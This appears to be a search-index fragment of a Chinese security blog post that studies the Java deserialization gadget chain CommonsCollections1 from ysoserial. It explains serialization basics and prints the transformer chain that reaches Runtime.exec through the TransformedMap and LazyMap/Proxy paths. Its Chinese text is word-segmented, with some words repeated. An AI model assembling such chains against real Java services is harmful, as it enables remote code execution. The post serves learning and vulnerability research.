\u4e25\u91cd \u7684 \u5f71\u54cd \u3002 \u5f80\u5f80 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u6f0f\u6d1e \u7684 \u5371\u5bb3 \u7a0b\u5ea6 \u53d6\u51b3 \u53d6\u51b3\u4e8e \u540e\u7eed \u7684 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u5229\u7528 \u6240\u80fd \u94fe\u6240\u80fd \u8fbe\u5230 \u7684 \u5371\u9669 \u7a0b\u5ea6 \u3002 \u5728 java \u4e2d   ysoserial   \u5de5\u5177 \u7ed9 \u6211\u4eec \u63d0\u4f9b \u4e86 \u8bb8\u591a \u5e38\u89c1 \u7684 \u5e93\u5b58 \u5728 \u7684 \u5229\u7528 \u94fe \uff0c \u8fd9 \u4e00\u8282 \u5c06 \u9010\u4e00 \u5206\u6790 \u8fd9\u4e9b \u5229\u7528 \u94fe \u3002   1 .   CommonsCollections1 ( jdk < = 7 )   \u53c2\u8003 \u94fe\u63a5   Apache   Commons   Collections \u662f \u4e00\u4e2a \u6269\u5c55 \u4e86 Java \u6807\u51c6 \u5e93\u91cc \u7684 Collection \u7ed3\u6784 \u7684 \u7b2c\u4e09 \u4e09\u65b9 \u7b2c\u4e09\u65b9 \u57fa\u7840 \u5e93 \uff0c \u5b83 \u63d0\u4f9b \u4e86 \u5f88\u591a \u6709\u529b \u5f3a\u6709\u529b \u7684 \u6570\u636e \u7ed3\u6784 \u6570\u636e\u7ed3\u6784 \u7c7b\u578b \u5e76\u4e14 \u5b9e\u73b0 \u4e86 \u5404\u79cd \u96c6\u5408 \u5de5\u5177 \u7c7b \u3002 \u4f5c\u4e3a Apache \u5f00\u6e90 \u9879\u76ee \u7684 \u91cd\u8981 \u7ec4\u4ef6 \uff0c Commons   Collections \u88ab \u5e7f\u6cdb \u5e94\u7528 \u5e7f\u6cdb\u5e94\u7528 \u4e8e \u5404\u79cd Java \u5e94\u7528 \u7684 \u5f00\u53d1 \u3002   CommonsCollection1 \u7684 \u5206\u6790 \u6587\u7ae0 \u6bd4\u8f83 \u591a \uff0c \u521a \u5f00\u59cb \u5148 \u4ece \u8fd9\u4e2a gadget \u5f00\u59cb \u5206\u6790 \u3002 \u8fd9\u91cc \u6211\u7528 \u7684 \u5206\u6790 \u65b9\u6cd5 \u5206\u6790\u65b9\u6cd5 \u662f \u5148 \u5199 \u4e00\u4e2a \u89e6\u53d1 \u70b9 \uff0c \u7136\u540e \u7528 ysoserial \u751f\u6210 payload \u6765 \u8c03\u8bd5 \u3002   CommonsCollections1   payload \u9488\u5bf9 \u7684 commons - collections   3.1 \u7248\u672c \uff0c \u5148 \u5f15\u5165 \u5e93   < ! --   https : / / mvnrepository . com / artifact / commons - collections / commons - collections   -- >   < dependency >   < groupId >   commons - collections   < / groupId >   < artifactId >   commons - collections   < / artifactId >   < version >   3.1   < / version >   < / dependency >   \u5728 ysoserial \u7684 exp \u4e2d \uff0c \u6211\u4eec \u53ef\u4ee5 \u770b\u5230 \u4e00 \u6574\u4e2a \u8c03\u7528 \u7684 \u94fe   \u6211\u4eec \u53ef\u4ee5 \u770b\u5230 \u5229\u7528 \u94fe \u7684 \u6700\u540e \u8c03\u7528 \u4e86   Runtime . getRuntime ( ) . exec ( )   \uff0c \u8fd9 \u610f\u5473 \u610f\u5473\u7740 \u6211\u4eec \u9700\u8981 \u5728 \u524d \u4e00\u6b65 \u7684 \u94fe \u4e0a \u53ef\u4ee5 \u8fbe\u5230 \u8c03\u7528 \u4efb\u610f \u7c7b \u548c \u65b9\u6cd5 \u7684 \u51fd\u6570 \u3002   CommonsCollections1 \u7528 \u7684 \u5c31\u662f 3.1 \u7248\u672c \u4e0b \u7684   InvokerTransformer . transform ( )   public   Object   transform   (   Object   input   )   {   if   (   input   = =   null   )   {   return   null   ;   }   try   {   Class   cls   =   input   .   getClass   ( ) ;   Method   method   =   cls   .   getMethod   (   iMethodName   ,   iParamTypes   ) ;   return   method   .   invoke   (   input   ,   iArgs   ) ;   }   catch   (   NoSuchMethodException   ex   )   {   throw   new   FunctorException   (   \" InvokerTransformer :   The   method   ' \"   +   iMethodName   +   \" '   on   ' \"   +   input   .   getClass   ( )   +   \" '   does   not   exist \"   ) ;   }   catch   (   IllegalAccessException   ex   )   {   throw   new   FunctorException   (   \" InvokerTransformer :   The   method   ' \"   +   iMethodName   +   \" '   on   ' \"   +   input   .   getClass   ( )   +   \" '   cannot   be   accessed \"   ) ;   }   catch   (   InvocationTargetException   ex   )   {   throw   new   FunctorException   (   \" InvokerTransformer :   The   method   ' \"   +   iMethodName   +   \" '   on   ' \"   +   input   .   getClass   ( )   +   \" '   threw   an   exception \"   ,   ex   ) ;   }   }   \u6b64\u5904 \u7528 \u7684 \u5c31\u662f Java \u7684 \u53cd\u5c04 \u673a\u5236 \uff0c \u52a8\u6001 \u8c03\u7528 \u7c7b \u548c \u65b9\u6cd5 \u3002 \u4e3a\u4e86 \u80fd \u52a8\u6001 \u8c03\u7528 \u4efb\u610f \u7c7b \u51fd\u6570 \uff0c \u6211\u4eec \u8fd8 \u5f97 \u63a7\u5236   iMethodName \u3001 iParamTypes \u3001 iArgs   \uff0c \u8be5\u7c7b \u5c5e\u6027 \u5b9a\u4e49 \u5728 InvokerTransformer \u7684 \u6784\u9020 \u51fd\u6570 \u6784\u9020\u51fd\u6570 \u4e0a   public   InvokerTransformer   (   String   methodName   ,   Class   [ ]   paramTypes   ,   Object   [ ]   args   )   {   super   ( ) ;   iMethodName   =   methodName   ;   iParamTypes   =   paramTypes   ;   iArgs   =   args   ;   }   \u90a3\u4e48 \u63a5\u4e0b \u4e0b\u6765 \u63a5\u4e0b\u6765 \u5c31 \u8ddf php \u7c7b\u4f3c \u4e86 \uff0c \u627e \u4e00\u4e2a \u7c7b \uff0c \u5b83 \u7684 \u7c7b \u5c5e\u6027 \u53ef\u63a7 \uff0c \u4e14 \u8be5\u7c7b \u5c5e\u6027 \u540e\u7eed \u8fd8\u4f1a \u8c03\u7528 transform \u51fd\u6570 \u3002 \u7531\u4e8e \u5b8c\u6210   Runtime . getRuntime ( ) . exec ( )   \u52a8\u4f5c \u9700\u8981 \u591a\u6b21 \u8c03\u7528 transform \u51fd\u6570 \uff08 \u5148 \u8c03\u7528 Runtime . getRuntime \u518d \u8c03\u7528 Runtime . exec \uff09 \uff0c \u6240\u4ee5 \u8fd8 \u5f97 \u627e \u4e00\u4e2a \u80fd \u591a\u6b21 \u8c03\u7528 transform \u7684 \u5730\u65b9 \uff0c \u6765\u770b \u4e00\u4e0b   ChainedTransformer   private   final   Transformer   [ ]   iTransformers   ;   / /   \u586b\u5145 \u6784\u9020 \u540e \u7684 \u5b9e\u4f8b   public   Object   transform   (   Object   object   )   {   for   (   int   i   =   0   ;   i   <   iTransformers   .   length   ;   i   ++   )   {   object   =   iTransformers   [   i   ]   .   transform   (   object   ) ;   / /   \u8c03\u7528 \u94fe \uff0c   }   return   object   ;   }   \u5728   Transformer   \u7684 \u5b50\u7c7b \u4e0b\u9762 \u627e\u5230 \u80fd \u751f\u6210 \u547d\u4ee4 \u6267\u884c \u7684 \u5229\u7528 \u94fe \u5373\u53ef \uff0c \u6765 \u5206\u6790 \u4e00\u4e0b CommonCollections1 \u7684 \u6784\u9020   / /   real   chain   for   after   setup   final   Transformer   [ ]   transformers   =   new   Transformer   [ ]   {   new   ConstantTransformer   (   Runtime   .   class   ) ,   / /   \u83b7\u53d6 Runtime \u5bf9\u8c61   new   InvokerTransformer   (   \" getMethod \"   ,   new   Class   [ ]   {   / / \u83b7\u53d6 Runtime . getRuntime ( ) \u65b9\u6cd5 \u5bf9\u8c61   String   .   class   ,   Class   [ ]   .   class   } ,   new   Object   [ ]   {   \" getRuntime \"   ,   new   Class   [   0   ]   } ) ,   new   InvokerTransformer   (   \" invoke \"   ,   new   Class   [ ]   {   / /   \u53cd\u5c04 \u8c03\u7528 invoke , \u518d invoke \u6267\u884c Runtime . getRuntime ( ) \u65b9\u6cd5 \uff0c \u83b7\u53d6 Runtime \u5b9e\u4f8b \u5316 \u5bf9\u8c61   Object   .   class   ,   Object   [ ]   .   class   } ,   new   Object   [ ]   {   null   ,   new   Object   [   0   ]   } ) ,   new   InvokerTransformer   (   \" exec \"   ,   / /   \u53cd\u5c04 \u8c03\u7528 exec \u65b9\u6cd5 \uff0c \u6267\u884c \u6700\u7ec8 \u7684 \u547d\u4ee4   new   Class   [ ]   {   String   .   class   } ,   execArgs   ) ,   new   ConstantTransformer   (   1   )   } ;   \u94fe \u7684 \u7b2c\u4e00 \u4e00\u4e2a \u7b2c\u4e00\u4e2a \u7ed3\u70b9 \u9009\u7528 \u7684 \u662f   ConstantTransformer   \uff0c \u5176 transformer \u76f4\u63a5 \u8fd4\u56de \u6784\u9020 \u65f6 \u7684 \u5bf9\u8c61   private   final   Object   iConstant   ;   / /   \u6b64\u65f6 iConstant \u7f6e \u4e3a Runtime . class   public   ConstantTransformer   (   Object   constantToReturn   )   {   super   ( ) ;   iConstant   =   constantToReturn   ;   }   public   Object   transform   (   Object   input   )   {   / /   \u76f4\u63a5 \u8fd4\u56de Runtime . class   return   iConstant   ;   }   \u6700\u7ec8 \u7684 \u8c03\u7528 \uff0c \u7c7b\u4f3c   Object   obj   =   Runtime   .   class   ;   Class   cls   =   obj   .   getClass   ( ) ;   Method   method   ;   method   =   cls   .   getMethod   (   \" getMethod \"   ,   new   Class   [ ]   {   String   .   class   ,   Class   [ ]   .   class   } ) ;   obj   =   method   .   invoke   (   obj   ,   new   Object   [ ]   {   \" getRuntime \"   ,   new   Class   [   0   ]   } ) ;   cls   =   obj   .   getClass   ( ) ;   method   =   cls   .   getMethod   (   \" invoke \"   ,   new   Class   [ ]   {   Object   .   class   ,   Object   [ ]   .   class   } ) ;   obj   =   method   .   invoke   (   obj   ,   new   Object   [ ]   {   null   ,   new   Object   [   0   ]   } ) ;   cls   =   obj   .   getClass   ( ) ;   method   =   cls   .   getMethod   (   \" exec \"   ,   new   Class   [ ]   {   String   .   class   } ) ;   method   .   invoke   (   obj   ,   new   String   [ ]   {   \" open   / System / Applications / Calculator . app \"   } ) ;   \u63a5\u4e0b \u4e0b\u6765 \u63a5\u4e0b\u6765 \u7684 \u95ee\u9898 \u662f \u5982\u4f55 \u89e6\u53d1   ChainedTransformer   \uff1f \u641c\u7d22 \u4e00\u4e0b \u8c03\u7528 transform \u7684 \u4f4d\u7f6e \uff0c \u6392\u9664 \u6389 xxxTransformer \u7c7b \uff0c \u6700\u6709 \u53ef\u80fd \u88ab \u5229\u7528 \u7684 \u5c31\u662f   LazyMap . get   \u3001   TransformedMap . checkSetValue   \uff0c \u5176\u4e2d checkSetValue \u4f1a \u5728 setValue \u51fd\u6570 \u88ab \u8c03\u7528 \u7684 \u65f6\u5019 \u8c03\u7528 \u3002   \u63a5\u4e0b \u4e0b\u6765 \u63a5\u4e0b\u6765 \u5c31\u662f \u627e\u80fd \u89e6\u53d1 \u4e0a\u9762 \u4e24\u4e2a \u5229\u7528 \u65b9\u5f0f \u7684 \u65b9\u6cd5 \u3002   \u540c\u6837 \u7684 \uff0c \u524d\u9762 \u57fa\u7840 \u77e5\u8bc6 \u57fa\u7840\u77e5\u8bc6 \u63d0\u5230 \uff0c \u5982\u679c \u4e00\u4e2a \u5bf9\u8c61 \u7684 readObject \u51fd\u6570 \u88ab \u91cd\u8f7d \u4e86 \uff0c \u4f1a \u4f18\u5148 \u8c03\u7528 \u91cd\u8f7d \u540e \u7684 readObject \u51fd\u6570 \u3002   \u6211\u4eec \u6700\u597d \u80fd \u5728 \u88ab \u91cd\u8f7d \u7684 readObject \u51fd\u6570 \u4e2d \u53d1\u73b0 \u76f8\u5173 \u53ef\u63a7 Map \u6570\u636e \u7684 \u64cd\u4f5c ( get \u548c setValue ) \u3002   \u800c exp \u4e2d   sun . reflect . annotation . AnnotationInvocationHandler   \u975e\u5e38 \u7b26\u5408 \u4e0a\u8ff0 \u7684 \u63cf\u8ff0 \u3002   \u6765\u770b \u4e00\u4e0b \u8fd9\u4e2a \u7c7b \u7684 readObject \u5b9e\u73b0   private   void   readObject   (   java   .   io   .   ObjectInputStream   s   )   throws   java   .   io   .   IOException   ,   ClassNotFoundException   {   s   .   defaultReadObject   ( ) ;   / /   Check   to   make   sure   that   types   have   not   evolved   incompatibly   AnnotationType   annotationType   =   null   ;   try   {   annotationType   =   AnnotationType   .   getInstance   (   type   ) ;   }   catch   (   IllegalArgumentException   e   )   {   / /   Class   is   no   longer   an   annotation   type ;   time   to   punch   out   throw   new   java   .   io   .   InvalidObjectException   (   \" Non - annotation   type   in   annotation   serial   stream \"   ) ;   }   Map   <   String   ,   Class   < ? > >   memberTypes   =   annotationType   .   memberTypes   ( ) ;   / /   If   there   are   annotation   members   without   values ,   that   / /   situation   is   handled   by   the   invoke   method .   for   (   Map   .   Entry   <   String   ,   Object   >   memberValue   :   memberValues   .   entrySet   ( ) )   {   String   name   =   memberValue   .   getKey   ( ) ;   Class   < ? >   memberType   =   memberTypes   .   get   (   name   ) ;   if   (   memberType   ! =   null   )   {   / /   i . e .   member   still   exists   Object   value   =   memberValue   .   getValue   ( ) ;   if   (   !   (   memberType   .   isInstance   (   value   )   | |   value   instanceof   ExceptionProxy   ) )   {   memberValue   .   setValue   (   new   AnnotationTypeMismatchExceptionProxy   (   value   .   getClass   ( )   +   \" [ \"   +   value   +   \" ] \"   ) .   setMember   (   annotationType   .   members   ( ) .   get   (   name   ) ) ) ;   }   }   }   }   \u5728 \u7b2c 26 \u884c\u5904 \uff0c \u8c03\u7528 \u4e86 memberValue . setValue \uff0c \u8fd9\u91cc \u7684 memberValue \u6211\u4eec \u53ef\u4ee5 \u5c06 \u5176\u7f6e \u4e3a \u6784\u9020 \u597d \u7684 TransformedMap \u5b9e\u4f8b \u3002   \u5728 \u8fd9\u4e2a TransformedMap \u5b9e\u4f8b \u4e0a \uff0c valueTransformer \u5c5e\u6027 \u88ab \u7f6e \u4e3a \u524d\u6587 \u7684 ChainedTransformer \u3002 \u8fd9\u6837 \u8fd9\u4e2a \u94fe \u5c31 \u4e32 \u8d77\u6765 \u4e86 \uff0c \u603b\u7ed3 \u4e00\u4e0b   sun . reflect . annotation . AnnotationInvocationHandler . readObject ( )   - >   memberValue . setValue ( )   = >   TransformedMap . setValue ( )   = >   TransformedMap . checkSetValue ( )   - >   valueTransformer . transform ( )   = >   ChainedTransformer . transform ( )   - >   \u524d \u6587 \u6784\u9020 \u7684 Runtime . getRuntime ( ) . exec ( )   \u7b2c\u4e8c \u4e8c\u79cd \u7b2c\u4e8c\u79cd \uff0c \u5229\u7528 LazyMap . get ( )   CommonsCollections1 \u4e2d \u5229\u7528 \u4e86 AnnotationInvocationHandler . invoke \u51fd\u6570   public   Object   invoke   (   Object   proxy   ,   Method   method   ,   Object   [ ]   args   )   {   String   member   =   method   .   getName   ( ) ;   / /   ...   switch   (   member   )   {   case   \" toString \"   :   return   toStringImpl   ( ) ;   case   \" hashCode \"   :   return   hashCodeImpl   ( ) ;   case   \" annotationType \"   :   return   type   ;   }   / /   Handle   annotation   member   accessors   Object   result   =   memberValues   .   get   (   member   ) ;   / /   ...   }   \u7b2c 15 \u884c \u8c03\u7528 \u4e86 memberValues . get \u51fd\u6570 \uff0c \u8fd9\u91cc \u5982\u679c memberValues \u8bbe\u7f6e \u4e3a \u6784\u9020 \u597d \u7684 LazyMap \u5b9e\u4f8b \uff0c \u5c06 \u89e6\u53d1 \u8be5 \u5229\u7528 \u94fe \u7684 \u6267\u884c \u3002   \u90a3\u4e48 \u600e\u4e48 \u6765 \u8c03\u7528 invoke \u51fd\u6570 \u5462 \uff1f \u8fd9\u91cc \u7528\u5230 \u4e86 Proxy \u52a8\u6001 \u4ee3\u7406 \u673a\u5236 \u3002 \u5728 \u8be5 \u673a\u5236 \u4e0b \u88ab \u4ee3\u7406 \u7684 \u5b9e\u4f8b \u4e0d\u7ba1 \u8c03\u7528 \u4ec0\u4e48 \u7c7b \u65b9\u6cd5 \uff0c \u90fd \u4f1a \u5148 \u8c03\u7528 invoke \u51fd\u6570 \u3002   \u90a3\u4e48 \u6211\u4eec \u5229\u7528 Proxy \u52a8\u6001 \u4ee3\u7406 AnnotationInvocationHandler \uff0c \u5e76 \u5c06 memberValues \u8bbe\u7f6e \u4e3a LazyMap \u3002 \u5728 AnnotationInvocationHandler . readObject \u51fd\u6570 \u91cc \uff0c \u7b2c 19 \u884c \u8c03\u7528 \u4e86 memberValues . entrySet \u51fd\u6570 \u3002 \u5728 \u52a8\u6001 \u4ee3\u7406 \u4e0b\u4f1a \u5148 \u8c03\u7528 invoke \u51fd\u6570 \uff0c \u4e14 \u6b64\u65f6 \u7684 \u51fd\u6570 \u540d entrySet \u4e0d \u5728 toString \u3001 hashCode \u3001 annotationType \u91cc \uff0c \u90a3\u4e48 \u4f1a \u6700\u7ec8 \u8d70\u5230 \u7b2c 15 \u884c \u7684 \u4f4d\u7f6e \u3002 \u603b\u7ed3 \u4e00\u4e0b \u8fd9\u4e2a \u8c03\u7528 \u94fe   sun . reflect . annotation . AnnotationInvocationHandler . readObject ( )   - >   memberValues . entrySet ( )   - >   AnnotationInvocationHandler . invoke ( )   - >   memberValues . get ( )   = >   LazyMap . get ( )   - >   factory . transform ( )   = >   ChainedTransformer . transform ( )   - >   \u524d \u6587 \u6784\u9020 \u7684 Runtime . getRuntime ( ) . exec ( )   \u8fd9 \u4e5f \u662f ysoserial \u7684 CommonsCollections1 \u7684 \u8c03\u7528 \u94fe \u3002   \u540e\u7eed \u7684 \u5229\u7528 \u5206\u6790 \u94fe\u5206\u6790 \u653e\u5728 \u4e0b \u4e00\u7bc7 \u6587\u7ae0 \u91cc \u3002   0x04   \u603b\u7ed3   \u7ecf\u8fc7 \u5bf9 ysoserial \u5de5\u5177 \u751f\u6210 \u7684 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u5229\u7528 \u94fe \u7684 \u8c03\u8bd5 \uff0c \u719f\u6089 \u4e86 Java \u7684 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u7684 \u4e00\u4e2a \u6d41\u7a0b \u3002 \u4f46 \u5bf9\u4e8e exp \u7684 \u4e66\u5199 \u4ecd\u7136 \u6709\u5f85 \u63d0\u9ad8 \u3002   \u9700\u8981 \u6ce8\u610f \u7684 \u662f \uff0c CommonCollections1 \u548c 3 \u7528 \u7684 override . class \u4f5c\u4e3a Annotation \u5728 jdk8 \u4e0a \u662f \u4e0d \u9002\u7528 \u7684 \uff0c \u8981 \u8c03\u8bd5 \u8fd9 \u4e24\u4e2a payload \u9700\u8981 \u7528 jdk7 \uff0c   \u53c2\u8003   \u9664\u6b64 \u4e4b\u5916 \u9664\u6b64\u4e4b\u5916 \uff0c \u5728 \u8c03\u8bd5 \u8fc7\u7a0b \u4e2d \uff0c \u4f53\u4f1a \u5230 \u4e86 javassist \u5e93 \u7684 \u5f3a\u5927 \uff0c \u4fee\u6539 jar \u5305\u91cc \u7684 class \u6587\u4ef6 \u975e\u5e38 \u8212\u670d \uff01   Proxy \u7684 \u52a8\u6001 \u4ee3\u7406 \u673a\u5236 \uff0c Java \u7684 \u53cd\u5c04 \u673a\u5236 \u76f8\u4fe1 \u4f1a \u662f \u540e\u7eed \u5b66\u4e60 \u7684 \u4e00\u4e2a \u91cd\u70b9 \uff0c \u7ee7\u7eed \ud83d\udcaa \uff01","title":"Java \u53cd \u5e8f\u5217\u5316 \u5229\u7528 \u94fe \u6316\u6398 \u4e4b CommonsCollections1"},{"location":"blog/2019/study-java-deserialized-commonscollections3-1-20191024/#0x00","text":"\u524d\u6bb5 \u65f6\u95f4 \u6bb5\u65f6\u95f4 \u524d\u6bb5\u65f6\u95f4 \u5728 \u590d\u73b0 shiro \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u6f0f\u6d1e \u7684 \u8fc7\u7a0b \u4e2d \uff0c \u53d1\u73b0 \u65e0\u6cd5 \u5f88 \u597d \u7684 \u7406\u89e3 CommonCollections4 \u4ec0\u4e48 \u4e3a\u4ec0\u4e48 \u65e0\u6cd5 \u6267\u884c \u547d\u4ee4 \u6267\u884c\u547d\u4ee4 \uff0c \u8fd8\u662f \u7f3a\u5c11 Java \u7684 \u4e00\u4e9b \u57fa\u7840 \u77e5\u8bc6 \u57fa\u7840\u77e5\u8bc6 \u3002 \u6240\u4ee5 \u8fd9\u91cc \u5c31 \u5148 \u505c\u4e0b \u4e86 \u590d\u73b0 \u6f0f\u6d1e \u7684 \u8fdb\u7a0b \uff0c \u5148 \u5c06 \u57fa\u7840 \u6253 \u624e\u5b9e \uff1a \uff09 \u3002 \u8fd9 \u6587\u7ae0 \u7bc7\u6587\u7ae0 \u5c06 \u8bb0\u5f55 \uff0c Java \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u6f0f\u6d1e \u7684 \u539f\u7406 \u4ee5\u53ca \u6d4b\u8bd5 \u73af\u5883 \u6d4b\u8bd5\u73af\u5883 \u3002   \u53c2\u8003 \u6587\u732e \u53c2\u8003\u6587\u732e \u90fd \u5d4c\u5165 \u5728 \u6587\u4e2d \u3002","title":"0x00   \u524d\u8a00"},{"location":"blog/2019/study-java-deserialized-commonscollections3-1-20191024/#0x01","text":"","title":"0x01   \u57fa\u7840\u77e5\u8bc6"},{"location":"blog/2019/study-java-deserialized-commonscollections3-1-20191024/#1-java","text":"\u5e8f\u5217 \u5e8f\u5217\u5316 \uff1a \u4f7f\u7528   ObjectOutputStream   \u7c7b \u7684   writeObject   \u51fd\u6570   public   final   void   writeObject   (   Object   x   )   throws   IOException   \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \uff1a \u4f7f\u7528   ObjectInputStream   \u7c7b \u7684   readObject   \u51fd\u6570   public   final   Object   readObject   ( )   throws   IOException   ,   ClassNotFoundException   \u652f\u6301 \u5e8f\u5217 \u5e8f\u5217\u5316 \u7684 \u5bf9\u8c61 \u5fc5\u987b \u6ee1\u8db3 \uff1a   \u5b9e\u73b0 \u4e86   java . io . Serializable   \u63a5\u53e3   \u5f53\u524d \u5bf9\u8c61 \u7684 \u6240\u6709 \u7c7b \u5c5e\u6027 \u53ef \u5e8f\u5217 \u5e8f\u5217\u5316 \uff0c \u5982\u679c \u6709 \u4e00\u4e2a \u5c5e\u6027 \u4e0d\u60f3 \u6216 \u4e0d\u80fd \u88ab \u5e8f\u5217 \u5e8f\u5217\u5316 \uff0c \u5219 \u9700\u8981 \u6307\u5b9a   transient   \uff0c \u4f7f\u5f97 \u8be5 \u5c5e\u6027 \u5c06 \u4e0d\u4f1a \u88ab \u5e8f\u5217 \u5e8f\u5217\u5316   \u4e3e\u4e2a \u4f8b\u5b50 ( \u6765\u6e90 \u6e90\u4e8e \u6765\u6e90\u4e8e   \u6b64\u5904   )   public   class   Employee   implements   java   .   io   .   Serializable   {   public   String   name   ;   public   String   address   ;   public   transient   int   SSN   ;   public   int   number   ;   public   void   mailCheck   ( )   {   System   .   out   .   println   (   \" Mailing   a   check   to   \"   +   name   +   \"   \"   +   address   ) ;   }   }   import   java . io . *   ;   public   class   SerializeDemo   {   public   static   void   main   (   String   [ ]   args   )   {   Employee   e   =   new   Employee   ( ) ;   e   .   name   =   \" Reyan   Ali \"   ;   e   .   address   =   \" Phokka   Kuan ,   Ambehta   Peer \"   ;   e   .   SSN   =   11122333   ;   e   .   number   =   101   ;   try   {   FileOutputStream   fileOut   =   new   FileOutputStream   (   \" / tmp / employee . ser \"   ) ;   ObjectOutputStream   out   =   new   ObjectOutputStream   (   fileOut   ) ;   out   .   writeObject   (   e   ) ;   out   .   close   ( ) ;   fileOut   .   close   ( ) ;   System   .   out   .   printf   (   \" Serialized   data   is   saved   in   / tmp / employee . ser \"   ) ;   }   catch   (   IOException   i   )   {   i   .   printStackTrace   ( ) ;   }   }   }   \u8fd0\u884c \u540e \uff0c \u751f\u6210 employee . ser   \u6839\u636e   \u5e8f\u5217 \u5e8f\u5217\u5316 \u89c4\u8303   \uff0c   aced   \u4ee3\u8868 java \u5e8f\u5217 \u5e8f\u5217\u5316 \u6570\u636e \u7684 magic   word   STREAM _ MAGIC   ,   0005   \u8868\u793a \u7248\u672c \u7248\u672c\u53f7   STREAM _ VERSION   ,   73   \u8868\u793a \u662f \u4e00\u4e2a \u5bf9\u8c61   TC _ OBJECT   ,   72   \u8868\u793a \u8fd9\u4e2a \u5bf9\u8c61 \u7684 \u63cf\u8ff0   TC _ CLASSDESC   \u6240\u4ee5 \u5728 \u65e5\u5e38 \u6d4b\u8bd5 \u4e2d \uff0c \u5982\u679c \u89e3\u5f00 \u7c7b\u4f3c Base64 \u540e \uff0c \u8d77\u59cb \u4e3a aced \u6253\u5934 \uff0c \u53ef\u4ee5 \u5c1d\u8bd5 \u4f7f\u7528 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u7684 payload \u3002   \u5728 \u5bf9 \u5176 \u505a \u5b8c \u5e8f\u5217 \u5e8f\u5217\u5316 \u64cd\u4f5c \u540e \uff0c \u6211\u4eec \u5728 \u53e6 \u4e00\u4e2a JVM \u4e2d \u6062\u590d \u8be5 \u5bf9\u8c61 \uff0c \u9700\u8981 \u7528\u5230   ObjectInputStream   import   java . io . *   ;   public   class   DeserializeDemo   {   public   static   void   main   (   String   [ ]   args   )   {   Employee   e   =   null   ;   try   {   FileInputStream   fileIn   =   new   FileInputStream   (   \" / tmp / employee . ser \"   ) ;   ObjectInputStream   in   =   new   ObjectInputStream   (   fileIn   ) ;   e   =   (   Employee   )   in   .   readObject   ( ) ;   in   .   close   ( ) ;   fileIn   .   close   ( ) ;   }   catch   (   IOException   i   )   {   i   .   printStackTrace   ( ) ;   return   ;   }   catch   (   ClassNotFoundException   c   )   {   System   .   out   .   println   (   \" Employee   class   not   found \"   ) ;   c   .   printStackTrace   ( ) ;   return   ;   }   System   .   out   .   println   (   \" Deserialized   Employee ... \"   ) ;   System   .   out   .   println   (   \" Name :   \"   +   e   .   name   ) ;   System   .   out   .   println   (   \" Address :   \"   +   e   .   address   ) ;   System   .   out   .   println   (   \" SSN :   \"   +   e   .   SSN   ) ;   System   .   out   .   println   (   \" Number :   \"   +   e   .   number   ) ;   }   }   readObject   \u51fd\u6570 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u4e86 \u4e0a\u9762 \u4ea7\u751f \u7684 \u8fdb\u5236 \u4e8c\u8fdb\u5236 \u6570\u636e \u6570\u636e\u6d41 \uff0c \u751f\u6210 \u4e86 \u539f\u6709 \u7684 \u5bf9\u8c61 \u6570\u636e \u7ed3\u6784 \u6570\u636e\u7ed3\u6784 \u3002 \u9700\u8981 \u6ce8\u610f \u7684 \u662f \uff0c \u7531\u4e8e SSN \u4e3a transient \uff0c \u5176 \u65e0\u6cd5 \u5e8f\u5217 \u5e8f\u5217\u5316 \uff0c \u6240\u4ee5 \u8fd8\u539f \u540e \u5176\u503c \u4e3a 0 \u3002   \u5982\u679c \u5728 \u5f85 \u5e8f\u5217 \u5e8f\u5217\u5316 \u7c7b\u4e0a \u5b9e\u73b0 \u4e86 readObject \u51fd\u6570 \uff0c \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u8fc7\u7a0b \u4e2d \u4f1a \u81ea\u52a8 \u8c03\u7528 \u8be5\u7c7b \u7684 readObject \u51fd\u6570 \u3002   \u4f8b\u5982 \u5728 Employee \u7c7b\u4e2d \u6dfb\u52a0 \u51fd\u6570 readObject   private   void   readObject   (   ObjectInputStream   in   )   throws   Exception   {   in   .   defaultReadObject   ( ) ;   System   .   out   .   println   (   \" Employee   call   readObject   Function \"   ) ;   }   \u5728 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u8fc7\u7a0b \u4e2d\u5c06 \u8fc7\u7a0b\u4e2d\u5c06 \u8c03\u7528 \u8be5 \u51fd\u6570","title":"1 .   Java \u4e2d \u7684 \u5e8f\u5217\u5316 \u548c \u53cd \u5e8f\u5217\u5316"},{"location":"blog/2019/study-java-deserialized-commonscollections3-1-20191024/#2","text":"\u4e0a\u9762 \u5c55\u793a \u4e86 \u5e8f\u5217 \u5e8f\u5217\u5316 \u548c \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u7684 \u539f\u7406 \uff0c \u5e76\u4e14 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u7684 \u89e6\u53d1 \u70b9\u4e3a   ObjectInputStream . readObject   \u3002 \u90a3\u4e48 \u95ee\u9898 \u6765 \u4e86 \uff0c \u662f\u5426 Java \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u53ea\u80fd \u7531\u8be5 \u70b9 \u89e6\u53d1 \uff1f \u7b54\u6848 \u5f53\u7136 \u662f \u5426\u5b9a \u7684 \u3002   \u9664\u4e86 \u4e0a\u9762 \u7684 \u65b9\u6cd5 \u5916 \uff0c \u8fd8\u6709 \u5982\u4e0b \u51e0\u79cd \u89e6\u53d1 \u65b9\u5f0f \uff1a   ObjectInputStream   .   readObject   / /   \u6d41 \u8f6c\u5316 \u4e3a Object   ObjectInputStream   .   readUnshared   / /   \u6d41 \u8f6c\u5316 \u4e3a Object   XMLDecoder   .   readObject   / /   \u8bfb\u53d6 xml \u8f6c\u5316 \u4e3a Object   Yaml   .   load   / /   yaml \u5b57\u7b26 \u5b57\u7b26\u4e32 \u8f6c Object   XStream   .   fromXML   / /   XStream \u7528\u4e8e Java   Object \u4e0e xml \u76f8\u4e92 \u8f6c\u5316   ObjectMapper   .   readValue   / /   jackson \u4e2d \u7684 api   JSON   .   parseObject   / /   fastjson \u4e2d \u7684 api   Note :   \u5bf9\u4e8e readUnshared \u51fd\u6570 \uff0c \u5176 \u4e0e readObject \u51fd\u6570 